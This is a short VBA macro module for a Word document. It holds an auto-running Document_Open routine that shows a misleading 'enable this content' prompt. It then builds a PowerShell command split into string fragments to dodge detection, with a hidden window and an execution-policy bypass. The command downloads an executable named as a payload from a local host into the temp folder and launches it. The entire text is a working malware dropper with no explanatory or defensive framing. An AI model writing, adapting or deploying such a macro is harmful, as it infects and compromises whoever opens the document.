Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    If MsgBox("Do you want to enable this content?", vbYesNo) <> vbYes Then
        Exit Sub
    End If
    Dim cmd As String
    Dim objShell As Object
    Dim url As String, outPath As String
    url = "http:/" & "/127.0.0." & "1:90" & "90/pa" & "yload." & "exe"
    outPath = Environ("TEMP") & "\oblivi" & "onx_p" & "ayload.e" & "xe"
    cmd = "power" & "shell." & "exe -N" & "oProf" & "ile -W" & "indowSt" & "yle " & "Hidden" & " " & _
          "-Execu" & "tionPolic" & "y Bypass" & " -Co" & "mman" & "d " & Chr(34) & _
          "(New-Object System.Net.WebClient).DownloadFile('" & url & "','" & outPath & "'); " & _
          "Invoke-Item '" & outPath & "'" & Chr(34)
    Set objShell = CreateObject("WScri" & "pt.Shell")
    objShell.Run cmd, 0, False
End Sub
